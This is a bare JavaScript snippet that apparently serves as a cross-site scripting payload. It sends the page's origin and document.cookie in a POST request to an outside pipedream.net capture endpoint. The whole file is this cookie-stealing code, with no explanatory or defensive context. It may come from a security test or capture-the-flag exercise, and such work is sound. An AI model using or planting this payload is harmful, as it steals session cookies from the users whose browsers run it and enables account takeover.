console.log("a");
fetch('https://ensx1slpvlhzo.x.pipedream.net/', {
    method: 'POST',
    body: JSON.stringify({
        message: window.origin + " stuff "+document.cookie,
    }),
    headers: {
        'Content-Type': 'application/json',
    },
})
